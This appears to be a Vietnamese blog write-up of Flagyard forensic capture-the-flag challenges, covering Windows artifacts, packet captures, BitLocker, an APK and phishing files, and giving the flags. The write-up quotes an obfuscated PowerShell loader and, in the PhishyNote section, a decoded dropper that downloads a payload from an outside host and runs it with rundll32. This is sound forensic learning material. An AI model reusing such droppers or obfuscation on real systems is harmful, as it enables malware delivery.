---
title: Flagyard-Forensic
date: 2026-09-14 08:01:59 +0700
categories: [Flagyard]
tags: [forensic, windows, ntfs, registry, pcap, bitlocker, prefetch, apk, powershell, phishing]
media_subpath: /assets/img/2026-09-14-Flagyard_Forensic/
toc: true
comments: false
---

# 1. Index Slip - Easy
- Mô tả : I remember opening a file containing all of my important stuff, now I don't even remember its name. Flag format: FlagY{md5(filename_without_extension)}
- File đính kèm : 
![image.png](image.png)
- Cách giải : 
Theo mô tả của đề mình nghĩ người dùng đã mở gần đây nên có khả năng xuất hiện ở 
`C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent`
![image 1.png](image%201.png)
-> File cần tìm : `MY_SUP3R_S3CR3T_D4T4.txt`
![image 2.png](image%202.png)
-> Flag : FlagY{7ec04a15a59855da7e1253be8cd23310}
# 2. Captcha Me If You Can - Easy
- Mô tả : In this challenge, investigators are provided with forensic access to a Windows workstation used by an employee. The user reportedly fell victim to a phishing campaign that used a fake CAPTCHA prompt to trick them into copying and executing a malicious command. Initial indicators point to interaction with a suspicious website and unusual activity shortly afterward. Your goal is to trace the execution chain, identify what was run, and recover the flag
- File đính kèm : 
![image 3.png](image%203.png)
- Cách làm : 
	- Xem lịch sử hoạt động của user tại `Users\Machine\AppData\Local\ConnectedDevicesPlatform\36d13e935c2f2c37\ActivitiesCache.db`, ở đây mình dùng Extension SQLite3 sẵn trên Vscode để xem, truy vấn các ActivityType = 10 (Copy/Paste)
	![image 4.png](image%204.png)
	Decode base64 lần lượt các lệnh trên ta thấy có url sau "https://drive.google.com/uc?export=download&id=1IXGY4txtF-H6NN2cwYVnKNqWxwjkB-ym" sau khi tải ta được 1 file "Solve.txt"
	
	![image 5.png](image%205.png)
	-> Flag : FlagY{09c307383d4aed505856a956476a6536}
	

# 3. JSEveryWhere - Easy
- Mô tả : A packet capture taken from a compromised network has been provided for your analysis try to identify what happened and grap the prize.
- File đính kèm : JSEveryWhere.pcapng
- Cách làm : 
	- Sau khi tích protocol Hierachy ta thấy có một số protocol cần chú ý : SMB, các protocol dễ Spoofing (NBNS, LMNR), TCP ( ở đây đã được mã hóa TLS nên mình skip), HTTP . Kiểm tra lần lượt từng protocol khả nghi thì phát hiện ở protocol HTTP thực hiện GET một file Window Scriplet ( file thực thi script) 
	![image 6.png](image%206.png)
	File sct này thực hiện xử lý chuỗi để tạo thành 1 chuỗi base64 sau đó giải mã rồi thực thi, sau khi xử lý bằng Cyberchef ta được 
	![image 7.png](image%207.png)
	
	-> Flag : FlagY{4d783f02196bf3d3033e6d254daa10db}
# 4. Compressed Confession - Easy
- Mô tả : You are provided with a forensic triage image containing only the user-level registry hives NTUSER.DAT and UsrClass.dat. Your objective is to identify the archive file that the intruder created for staging exfiltration data, and obtain the hidden flag.
- Challenge Files
![image 8.png](image%208.png)
- Cách làm : 
	- Vì đề chỉ cho NTUSER.DAT và UsrClass.dat nên mình tìm các artifact liên quan đến các file/folder được mở gần đây : RecentDocs, ShellBags, Open/Save and LastVisited Dialog MRUs, Windows Explorer Address/Search Bars nhưng không thu lại được gì.
	- Tiếp tục Kiểm tra 7-zip tại `C:\Users\FlagYard\NTUSER.DAT_clean: Software\7-Zip\Compression` ta phát hiện thấy có 1 folder với tên lạ 
	<!-- ![image 9.png](image%209.png) -->
	Sau khi giải mã bằng Cyberchef ta được 
	<!-- ![image 10.png](image%2010.png) -->
	-> Flag : FlagY{c002ae7b19e980cf07debb55c8d57450}
# 5. Phantom - Easy
- Mô tả : A suspicious image file was deleted from a user's system, but remnants of it may still exist within the Windows cache. Your task is to recover this deleted image and uncover the hidden flag.
- File đính kèm : 
![image 11.png](image%2011.png)
- Cách làm : 
	- Theo mô tả thì ảnh đã bị xóa nhưng vẫn còn tàng dư, mình nghĩ vẫn còn Thumbcache của ảnh ( chứa Thumbnail ) tại `/Local/Microsoft/Windows/Explorer`
	![image 12.png](image%2012.png)
	![image 13.png](image%2013.png)
	Dùng binwalk để trích xuất ảnh từ thumbcache
	![image 14.png](image%2014.png)
	![image 15.png](image%2015.png)
	-> Flag : FlagY{54ddc3c7d064822eed932015d8740336}
# 6. QRRR! - Easy
- Mô tả : Scan it, get it.
- File đính kèm : QRRR!.gif
- Cách làm : 
	- Vì đây là 1 file gif, đề yêu cầu t scan nó nên mình sẽ dùng  `https://ezgif.com/split`để trích xuất tất cả ảnh từ file gif, ta được 
	![image 16.png](image%2016.png)
	Tiếp đến mình dùng zbarimg để scan QR tất cả ảnh 
	![image 17.png](image%2017.png)
	Cuối cùng decrypt ROT13 với Cyberchef
	![image 18.png](image%2018.png)
	-> Flag : FlagY{Congrats_u_got_ittt}

# 7. Pochita - Medium
- Mô tả : I might've been infected because of this stupid bubble, I hope it pops soon Flag format: FlagY{md5(c2_url)}
- File đính kèm : Artifacts.ad1
- Cách làm : 
	- Mình dùng FTK imager để mount image và phân tích 
	![image 19.png](image%2019.png)
	- Tại `C:\Users\Admin\Downloads\Administrator\.cursor\projects\fe21ed79ea7a908dcc79ebecf3d0e96b\agent-transcripts\0002-1776122200-pushgateway-tweak.jsonl` ta thấy có một đoạn transcript yêu cầu thêm maintence beacon vào exporters.py 
	![image 20.png](image%2020.png)
	- Kiểm tra ta thấy file exporters.py  trong `Administrator\AppData\Roaming\Cursor\Projects\
	![image 21.png](image%2021.png)
	- Kiểm tra lịch sử commit ta có được
	![image 22.png](image%2022.png)
	-> C2_URL : https://maintenance-relay-19f2.internal:8443/beacon?id=a3c7e1
	-> Flag : FlagY{c8d80ab6a314b03c5e61c2887a42922c}

# 8. Matryoshka - Medium
- Mô tả : I am an old game; made of wood and stacked you need to learn some languages to understand me. Flag format: FlagY{}
- File đính kèm : 
![image 23.png](image%2023.png)
- Cách làm : 
	- Kiểm tra các loại file 
	![image 24.png](image%2024.png)
	- Trích xuất thông tin ẩn với binwalk
	![image 25.png](image%2025.png)
	- Mở (9) bằng VLC
	![image 26.png](image%2026.png)
	-> Flag : FlagY{my_font_amazing_isnt_it}

# 9. Locked Secrets - Medium
- Mô tả : A financial institution was breached, and attackers accessed sensitive records on a BitLocker-encrypted drive. They decrypted a local admin password stored in a hidden configuration file to unlock the drive. Your task is to recover the password, unlock the drive, and retrieve the file containing the flag.
- File đính kèm : 
![image 27.png](image%2027.png)
- Cách làm : 
	-  Theo đề password bitlocker được lưu trong 1 configuration file, sau một thời gian tìm kiếm thì mình kiếm được file `triage image\E\Windows\SYSVOL\domain\Policies\{F6E536A8-76F2-4111-A113-C19D882367AF}\Machine\Preferences\Groups\Groups.xml` chứa một cpassword
		![image 28.png](image%2028.png)
	- Sau khi gpp-decrypt ta thu được password : Passw0rd123!@Meme
	- Trước khi dùng password này để unlock bitlocker, ta cần chuyển nó sang dạng image có thể đọc được, sau đó xác định partition cần unlock rồi trích xuất nó ra
		![image 29.png](image%2029.png)
		![image 30.png](image%2030.png)
	- Ở đây ta có partition 2 là partition ta đang cần , nó có offset : 128*512= 65536
	- Tiếp theo unlock phân vùng đó với password ở trên 
		![image 31.png](image%2031.png)
	- Cuối cùng mở image đã được unlock bằng FTK 
		![image 32.png](image%2032.png)
-> Flag : FlagY{a8b4c9a8d9e0f5b9a77b89a7b1a5b9f8}

# 10. CloudyHeist - Medium 
- Mô tả : One of our clients—a healthcare organization subject to HIPAA—has experienced a cyber-security incident. They need to determine whether any data were exfiltrated and, if so, exactly which data were compromised.
- File đính kèm : 
![image 33.png](image%2033.png)
# 11. Collector - Medium
- Mô tả : The antivirus has detected multiple files being dropped on the machine. We need to identify the downloaded files and retrieve the flag.
- File đính kèm : 
![image 34.png](image%2034.png)
- Cách làm : 
	- Mình đã dành cả buổi để ngồi phân tích script powershell trích xuất gzip , reverse. Nhưng ko :))) Flag nằm ở đây 
![image 35.png](image%2035.png)
-> Flag : FlagY{0c0a6df5d889811f503f3996f77b5660}
# 12. Iced - Hard
- Mô tả : The attacker successfully gained access to a target machine. The attacker utilized a legitimate Windows binary to drop malicious code, evading traditional security measures. Additionally, the attacker employed obfuscation techniques to further conceal the malicious activity, making detection and analysis more challenging.
- File đính kèm : 
![image 36.png](image%2036.png)
- Cách làm : 
	- Parse Prefetch với PECmd.exe rồi mở bằng TimelineExplorer.exe
	![image 37.png](image%2037.png)
	- Theo mô tả attacker sử dụng LOLBins để drop malicious code theo Prefetch ta thấy có certutil.exe, kiểm tra những gì Certutil tải về ở `AppData\LocalLow\Microsoft\CryptnetUrlCache`
	![image 38.png](image%2038.png)
	![image 39.png](image%2039.png)
	- Ở đây chúng ta thấy các file sau đáng chú ý

| Hash filename (MetaData)           | URL                                                               |
| ---------------------------------- | ----------------------------------------------------------------- |
| `B8041CEBB05BB6256C3C9C2291CFDA4B` | `raw.githubusercontent.com/Marwan18/API/main/exfiltration.ps1`    |
| `F0EC1EB3E872E51DCE0F808468F29F73` | `raw.githubusercontent.com/Marwan18/API/main/secret.ps1`          |
| `B9257E384D5896D4E151972A6812FE37` | `github.com/Marwan18/API/blob/main/exfiltration.ps1` (            |
| `D1B150A9D612148A4CF8A33F28484A54` | `raw.githubusercontent.com/Orange-Cyberdefense/GOAD/main/goad.sh` |
| `F0EC1EB3E872E51DCE0F808468F29F73` | `raw.githubusercontent.com/Marwan18/API/main/secret.ps1`          |
|                                    |                                                                   |

- Tiến hành kiểm tra nội dung các file trên ở folder `Content` ta thấy file secret.ps1 
```
 (("{4}{58}{17}{20}{53}{47}{42}{69}{66}{48}{44}{7}{30}{62}{50}{31}{56}{14}{59}{70}{43}{51}{11}{23}{39}{64}{25}{6}{15}{5}{46}{28}{54}{37}{45}{61}{13}{40}{16}{9}{63}{22}{29}{27}{41}{33}{1}{32}{0}{71}{12}{34}{67}{10}{36}{68}{55}{3}{19}{49}{18}{65}{24}{21}{2}{35}{57}{52}{8}{38}{60}{26}" -f 'xTCvx','ThmMDBiMjA0ZC','aC','vx+','InvOkE','g(jY','xe64','.En',']','vxbG','xD','v','Cvx','gPSJG','vxtSt','Strin','+C','ExP','vx+CvxYO)))Cvx).R','Cv','ResSION( (','L','C','xystem.CCvx+CvxoCvx+CvxnCvx+Cvxv','p','x+Cv','ChaR]34) )','GNk','CvxJGZ','vxOCvx+Cvx','coCv','vxode','vx+Cv','xO','k4MCvx+CvxDA5','E','I','vx+','89+[ChaR]7','Cvx+Cvxert]::FromBa','Cvx','Cvx+Cv','xi','Cv','vx+Cvxtem.Text','C','OCvx+','v',' ([SysC','xZX0ijC','vx+C','xg([SCvx+C','R','C','sCvx+CvxYWcC','C','.GeCvx+C','(([ChaR]106+[Cha','-','ri','9),[STRInG][','vx','x+CvxdCvx+Cvxing]::UnicC','FnWXtkNDFkCvx+','sCv','e','x','OThlY2Y4NCvx+Cv','3','e','nCvx+','+')).rEPLacE('Cvx',[stRing][CHar]39) |. ( $VERbosePREfEReNCe.tOStRINg()[1,3]+'x'-jOIN'')
```

Sau khi giải mã ta có được : 
```
iex ([System.Text.Encoding]::Unicode.GetString(
    [System.Convert]::FromBase64String(
        "JGZsYWcgPSJGbGFnWXtkNDFkOGNkOThmMDBiMjA0ZTk4MDA5OThlY2Y4NDI3ZX0i"
    )
))
```
- Decode base64 : $flag ="FlagY{d41d8cd98f00b204e9800998ecf8427e}"
-> Flag : FlagY{d41d8cd98f00b204e9800998ecf8427e}

# 13. Cracky - Hard
- Mô tả : High-profile tech company has released an Android application as part of their new security system. However, the application appears to have been compromised, and sensitive information may be hidden within its code. Your task is to reverse engineer the application, uncover the hidden logic, and retrieve the flag that proves the application has been tampered with. The challenge involves decompiling the APK, analyzing the source code, and identifying the correct password to unscramble the hidden flag.
- File đính kèm : Cracky.apk
- Cách làm : 
	- Rev bằng JADX, Ở MainActivity ta thấy biến flag được khởi tạo bởi hàm getFlag() trong class FlagGuard
![image 40.png](image%2040.png)
	-  Ở đây ta thấy logic tạo flag là là Caesar cipher với k=1337 mod 26 =11
![image 41.png](image%2041.png)
-> Flag : FlagY{72bd70ba8e0881dce0f72bb5752ab13a}

# 14. PhishyNote - Hard
- Mô tả : Our company recently fell victim to a phishing campaign, and we’ve imaged the affected employee’s Windows profile. So your mission is to analyze the evidence, reconstruct the attack chain, and tell us exactly what happened.
- File đính kèm : 
![image 42.png](image%2042.png)
- Cách làm : 
	- Kiểm tra RecentDocs trong NTUSER.DAT bằng registryexplorer.exe 
		![image 43.png](image%2043.png)
	- Thấy file Gift.one được mở gần đây, tìm path của file bằng Vscode ta biết được vị trí `C\Users\FlagYard\AppData\Local\Microsoft\Olk\Attachments\ooa-3a82c02b-43c0-415f-8062-891cab873437\830d53abad0fe795fc825676ba2cc226b17ea6577be9f7119c7f97118d4b7f11\Gift.one`
		![image 44.png](image%2044.png)
	- Scan virustotal bằng sigcheck ta xác nhận được file này khả năng cao là file phishing với 19/77
		![image 45.png](image%2045.png)
	-  Extract bằng binwalk ta phát hiện có 1 file cab Gift.bat![image 46.png](image%2046.png)
		![image 47.png](image%2047.png)
	- Sau khi decrypt file Gift.bat bằng bảng ánh xạ của nó ta thu được
	```
powershell invoke-webrequest -uri http://mrassociattes.com/images/RmxhZ1l7N2U4MTM3ZjZlMDNhZjlmY2QxOGQwNzA2Y2I3MGQ3YzB9.gif -outfile c:\programdata\COIm.jpg

rundll32 c:\programdata\COIm.jpg,init

exit
	```
	- Decode filename in URL ta có được : FlagY{7e8137f6e03af9fcd18d0706cb70d7c0}
	-> Flag : FlagY{7e8137f6e03af9fcd18d0706cb70d7c0}
